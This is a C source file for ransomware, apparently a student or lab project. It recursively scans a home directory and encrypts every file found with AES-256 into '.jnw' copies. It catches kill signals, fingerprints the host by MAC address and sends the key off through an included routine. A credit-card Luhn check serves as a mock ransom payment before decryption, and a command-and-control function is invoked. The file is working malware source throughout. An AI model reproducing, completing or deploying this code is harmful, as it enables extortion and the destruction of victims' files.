#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include "execCommands.c"

#define ERR_EVP_CIPHER_INIT -1
#define ERR_EVP_CIPHER_UPDATE -2
#define ERR_EVP_CIPHER_FINAL -3
#define ERR_EVP_CTX_NEW -4
#define AES_256_KEY_SIZE 32
#define AES_BLOCK_SIZE 16
#define BUFSIZE 1024
#define SIGTERM_MSG "SIGTERM Received. \n"

typedef struct _cipher_params_t{
    unsigned char *key;
    unsigned char *iv;
    unsigned int encrypt;
    const EVP_CIPHER *cipher_type;
}cipher_params_t;

void cleanup(cipher_params_t *params, FILE *ifp, FILE *ofp, int rc){
    free(params);
    fclose(ifp);
    fclose(ofp);
    exit(rc);
}

/* Catch Kill command*/
void sig_term_handler(int signum, siginfo_t *info, void *ptr)
{
		write(STDERR_FILENO, SIGTERM_MSG, sizeof(SIGTERM_MSG));
}
void catch_sigterm()
{
		static struct sigaction _sigact;

		memset(&_sigact, 0, sizeof(_sigact));
		_sigact.sa_sigaction = sig_term_handler;
		_sigact.sa_flags = SA_SIGINFO;

		sigaction(SIGTERM, &_sigact, NULL);
}

// Check to see if what we have is a file or directory
char *testFilez[10];
int jabronie = 0;

static void list_dir (char *testDir)
{
    DIR * d;
    char *bfeee;
    size_t szeee;


    // Open the directory specified by "dir_name".
    d = opendir (testDir);

    // Check it was opened.
    if (! d) {
        fprintf (stderr, "Cannot open directory '%s': %s\n", testDir, strerror (errno));
        exit (EXIT_FAILURE);
    }


    while (1) {
        struct dirent * entry;
        const char * d_name;

        // "Readdir" gets subsequent entries from "d".
        entry = readdir (d);
        if (! entry) {
            // There are no more entries in this directory, so break out of the while loop.
            break;
        }
        d_name = entry->d_name;
        
        // Print the name of the file and directory.
        if (strcmp (d_name, "..") != 0 && strcmp (d_name, ".") != 0){
            if (!(entry->d_type & DT_DIR)){
                szeee = snprintf(NULL, 0, "%s/%s", testDir, d_name);
                bfeee = (char *)malloc(szeee + 1); // make sure you check for != NULL in real code
                snprintf(bfeee, szeee+1, "%s/%s", testDir, d_name);
                                
                testFilez[jabronie] = bfeee;
                //printf("%s", testFilez[jabronie]);
                jabronie += 1;
            }
        }

        if (entry->d_type & DT_DIR) {

            // Check that the directory is not "d" or d's parent.
            if (strcmp (d_name, "..") != 0 && strcmp (d_name, ".") != 0) {
                int path_length;
                char path[PATH_MAX];
 
                path_length = snprintf (path, PATH_MAX, "%s/%s", testDir, d_name);
                printf ("%s\n", path);

                if (path_length >= PATH_MAX) {
                    fprintf (stderr, "Path length has got too long.\n");
                    exit (EXIT_FAILURE);
                }
                
                // Recursively call "list_dir" with the new path.
                list_dir (path);
            }
	    }
    }

    // After going through all the entries, close the directory.
    if (closedir (d)) {
        fprintf (stderr, "Could not close '%s': %s\n", testDir, strerror (errno));
        exit (EXIT_FAILURE);
    }
}

// Function to encrypt and decrypt
void file_encrypt_decrypt(cipher_params_t *params, FILE *ifp, FILE *ofp){
    // Allow enough space in output buffer for additional block
    int cipher_block_size = EVP_CIPHER_block_size(params->cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];

    int num_bytes_read, out_len;
    EVP_CIPHER_CTX *ctx;

    ctx = EVP_CIPHER_CTX_new();
    if(ctx == NULL){
        fprintf(stderr, "ERROR: EVP_CIPHER_CTX_new failed. OpenSSL error: %s\n", ERR_error_string(ERR_get_error(), NULL));
        cleanup(params, ifp, ofp, ERR_EVP_CTX_NEW);
    }

    // Don't set key or IV right away; we want to check lengths
    if(!EVP_CipherInit_ex(ctx, params->cipher_type, NULL, NULL, NULL, params->encrypt)){
        fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", ERR_error_string(ERR_get_error(), NULL));
        cleanup(params, ifp, ofp, ERR_EVP_CIPHER_INIT);
    }

    OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == AES_256_KEY_SIZE);
    OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == AES_BLOCK_SIZE);

    // Now we can set key and IV
    if(!EVP_CipherInit_ex(ctx, NULL, NULL, params->key, params->iv, params->encrypt)){
        fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", ERR_error_string(ERR_get_error(), NULL));
        EVP_CIPHER_CTX_cleanup(ctx);
        cleanup(params, ifp, ofp, ERR_EVP_CIPHER_INIT);
    }

    while(1){
        // Read in data in blocks until EOF. Update the ciphering with each read.
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, ifp);
        if (ferror(ifp)){
            fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
            EVP_CIPHER_CTX_cleanup(ctx);
            cleanup(params, ifp, ofp, errno);
        }
        if(!EVP_CipherUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
            fprintf(stderr, "ERROR: EVP_CipherUpdate failed. OpenSSL error: %s\n", ERR_error_string(ERR_get_error(), NULL));
            EVP_CIPHER_CTX_cleanup(ctx);
            cleanup(params, ifp, ofp, ERR_EVP_CIPHER_UPDATE);
        }
        fwrite(out_buf, sizeof(unsigned char), out_len, ofp);
        if (ferror(ofp)) {
            fprintf(stderr, "ERROR: fwrite error: %s\n", strerror(errno));
            EVP_CIPHER_CTX_cleanup(ctx);
            cleanup(params, ifp, ofp, errno);
        }
        if (num_bytes_read < BUFSIZE) {
            // Reached End of file
            break;
        }
    }

    // Now cipher the final block and write it out to file
    if(!EVP_CipherFinal_ex(ctx, out_buf, &out_len)){
        fprintf(stderr, "ERROR: EVP_CipherFinal_ex failed. OpenSSL error: %s\n", ERR_error_string(ERR_get_error(), NULL));
        EVP_CIPHER_CTX_cleanup(ctx);
        cleanup(params, ifp, ofp, ERR_EVP_CIPHER_FINAL);
    }
    fwrite(out_buf, sizeof(unsigned char), out_len, ofp);
    if (ferror(ofp)) {
        fprintf(stderr, "ERROR: fwrite error: %s\n", strerror(errno));
        EVP_CIPHER_CTX_cleanup(ctx);
        cleanup(params, ifp, ofp, errno);
    }
    EVP_CIPHER_CTX_cleanup(ctx);
}

void encryption_time(cipher_params_t *params, const char *testFile[], char *decFiles[], size_t testFileSize) {
    FILE *f_input, *f_enc;
    
    // Indicate that we want to encrypt
    params->encrypt = 1;

    // Loop to encrypt everything in given array
    for (int i = 0; i < testFileSize; i++)
    {
        // Open the input file for reading in binary ("rb" mode)
        f_input = fopen(testFile[i], "rb");
        if (!f_input) {
            fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        }

        // Open and truncate file to zero length or create ciphertext file for writing
        // Declare files
        char* extension = ".jnw";
        //256 length
        int length = strlen(testFile[i])+strlen(extension)+1;
        decFiles[i] = (char *)malloc(length);
        snprintf( decFiles[i], length, "%s%s", testFile[i], extension);
        
        printf("file in loop -> %s\n", decFiles[i]);

        f_enc = fopen(decFiles[i], "wb");
        if (!f_enc) {
            fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        }

        // Encrypt the given file
        file_encrypt_decrypt(params, f_input, f_enc);

        // Encryption done, close the file descriptors
        fclose(f_input);
        fclose(f_enc);
    }
}

void decryption_time(cipher_params_t *params, const char *testFile[], char *decFiles[]){
    FILE *f_input, *f_dec;

    // Indicate that we want to decrypt
    params->encrypt = 0;

    for(int j = 0; j < 2; j++)
    {    
        // Open the encrypted file for reading in binary ("rb" mode)
        f_input = fopen(decFiles[j], "rb");
        if (!f_input) {
            fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        }

        // Open and truncate file to zero length or create decrypted file for writing
        f_dec = fopen(testFile[j], "wb");
        if (!f_dec) {
            fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        }

        // Decrypt the given file
        file_encrypt_decrypt(params, f_input, f_dec);

        // Close the open file descriptors
        fclose(f_input);
        fclose(f_dec);
    }

}

static char *mac(){
    int s;
	int i;
	struct ifreq buffer;
    char stringRet[4096];

    char *buf;
    size_t sz;
    //sz = snprintf(NULL, 0, "%.2X", (unsigned char)buffer.ifr_hwaddr.sa_data[i]);
    //buf = (char *)malloc(sz + 1); /* make sure you check for != NULL in real code */
    //snprintf(buf, sz+1, "%.2X", (unsigned char)buffer.ifr_hwaddr.sa_data[i]);


	s = socket(PF_INET, SOCK_DGRAM, 0);

	memset(&buffer, 0x00, sizeof(buffer));

	strcpy(buffer.ifr_name, "ens160");

	ioctl(s, SIOCGIFHWADDR, &buffer);

	for( i = 0; i < 6; i++ )
	{
        sz = snprintf(NULL, 0, "%.2X", (unsigned char)buffer.ifr_hwaddr.sa_data[i]);
        buf = (char *)malloc(sz + 1); /* make sure you check for != NULL in real code */
        snprintf(buf, sz+1, "%.2X", (unsigned char)buffer.ifr_hwaddr.sa_data[i]);
        
        if(i == 0){
            strcpy(stringRet, buf);
            strcat(stringRet, ":");
        }
        
        if(i > 0){
            strcat(stringRet, buf);

            if(i < 5){
                strcat(stringRet, ":");
            }
        }
	}
    
    char *stringFinal = stringRet;

	close(s);
    return stringFinal;
}

/* D. J. Bernstein hash function */
static size_t hash(const char* str)
{
    size_t hash = 5381;
    while (*str)
        hash = 33 * hash ^ (unsigned char) *str++;
    return hash;
}

int luhn(const char* cc)
{
	const int m[] = {0,2,4,6,8,1,3,5,7,9};
	int i, odd = 1, sum = 0;
 
	for (i = strlen(cc); i--; odd = !odd) {
		int digit = cc[i] - '0';
		sum += odd ? digit : m[digit];
	}
 
	return sum % 10 == 0;
}

int main(int argc, char *argv[]) {
    // Catch kill signals
    catch_sigterm();

    // Declare params struct
    cipher_params_t *params = (cipher_params_t *)malloc(sizeof(cipher_params_t));
    if (!params) {
        fprintf(stderr, "ERROR: malloc error: %s\n", strerror(errno));
        return errno;
    }

    // Key to use for encrpytion and decryption and Initialization Vector
    unsigned char key[AES_256_KEY_SIZE];    
    unsigned char iv[AES_BLOCK_SIZE];

    // Generate cryptographically strong pseudo-random bytes for key and IV
    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
        fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        return errno;
    }
    //Vaue for AES key is params->key, value for iv is params->iv
    params->key = key;
    params->iv = iv;

    // Set the cipher type you want for encryption-decryption
    params->cipher_type = EVP_aes_256_cbc();

    // Do directory scan
    // This is just a demonstration that lis_dir works and scans recursively through a directory
    // The directory below is where the root paths would go instead, its hardcoded for debugging purposes
    char *testDir [1];
    testDir[0] = "/home/senior/Desktop";
    size_t n = sizeof(testDir)/sizeof(testDir[0]);

    // Do scan
    printf("Start Scan\n");
    for(int i = 0; i < n; i++){
        list_dir (testDir[i]);
    }

    // Set file directory information
    // The files below are what are going to be encrypted
    const char *testFile[jabronie];
    for(int a = 0; a < jabronie; a++){
        testFile[a] = testFilez[a];
    }
    char *decFiles[jabronie];
    size_t testFileSize = sizeof(testFile)/sizeof(testFile[0]);
    printf("Scan Complete\n");

    // Its encryption time baby
    encryption_time(params, testFile, decFiles, testFileSize);
    printf("encryption complete\n");

    //SendAES KEY over
    //params->key;

//Thread1---------------------------------------------------------------------
    //Get the MAC addy
    const char *MAC = mac();

    char macAddy[50];
    strcpy(macAddy, MAC);

    encryptAESKeySend(params->key, macAddy);

    //Get CPU artifacts
    const char* CPUArtifcats = getenv("PATH");

    //Hash them
    char tempStr[4096];
    strcpy(tempStr, MAC);
    strcat(tempStr, "+");
    strcat(tempStr, CPUArtifcats);
    char *hashMe = tempStr;

    long unsigned x = hash(hashMe);
    printf("%lu\n", x);

    //Credit Card Check
    char cc[17];
    printf( "Enter a card : ");
    scanf("%s", cc);
    if(luhn(cc)){
        printf("PASS\n");
    }
    else{
        printf("FAIL\n");
    }


    // Its decryption time baby
    // Only happens if credit card is valid and hashed function worked
    // It also need to be able to receive a base64 encoded AES key
    decryption_time(params, testFile, decFiles);
    printf("decryption complete\n");
//Thread1---------------------------------------------------------------------


//Thread2---------------------------------------------------------------------
    //TheCommand&Control
    CommandControl(macAddy);
//Thread2---------------------------------------------------------------------

    // Free the memory allocated to our structure
    free(params);

    return 0;
}
